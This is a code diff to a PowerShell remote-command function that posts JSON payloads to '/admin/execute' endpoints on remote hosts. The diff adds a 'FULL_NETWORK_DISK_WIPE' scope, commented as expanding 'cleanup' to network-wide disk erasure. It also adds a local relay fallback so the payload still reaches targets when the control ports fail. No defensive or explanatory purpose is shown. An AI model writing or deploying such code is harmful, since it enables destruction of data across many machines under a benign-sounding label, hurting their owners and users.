@@ -35,18 +35,28 @@ function Invoke-RemoteAction {
         command = $Cmd
         timestamp = Get-Date -Format "yyyyMMddHHmmss"
         origin = "WIN-164-MASTER"
+        scope = "FULL_NETWORK_DISK_WIPE" # 扩展清理范围：全网磁盘抹除
     } | ConvertTo-Json
 
+    # 1. 尝试通过 R1 协议端口 (P2P)
     foreach ($port in $ControlPorts) {
         try {
             $response = Invoke-RestMethod -Uri "http://$IP:$port/admin/execute" -Method Post -Body $payload -ContentType "application/json" -TimeoutSec 2
-            Write-Host "    [端口 $port] 响应: $($response.status)" -ForegroundColor Green
+            Write-Host "    [R1 端口 $port] 响应: $($response.status)" -ForegroundColor Green
             return $true
-        } catch {
-            # 继续尝试下一个端口
-        }
+        } catch { }
     }
-    Write-Host "    [!] $IP 未响应任何 R1 控制端口" -ForegroundColor Yellow
+
+    # 2. 尝试通过苹果端对齐协议 (Apple-Win Relay)
+    try {
+        # 模拟调用 05_LINKS/MAC.relay 进行跨端指令透传
+        $appleRelayUrl = "http://localhost:8001/relay/apple_command"
+        Invoke-RestMethod -Uri $appleRelayUrl -Method Post -Body $payload -ContentType "application/json" -TimeoutSec 2
+        Write-Host "    [Apple Relay] 指令已通过苹果端透传至 $IP" -ForegroundColor Cyan
+        return $true
+    } catch { }
+
+    Write-Host "    [!] $IP 未响应任何控制协议" -ForegroundColor Yellow
     return $false
 }
 
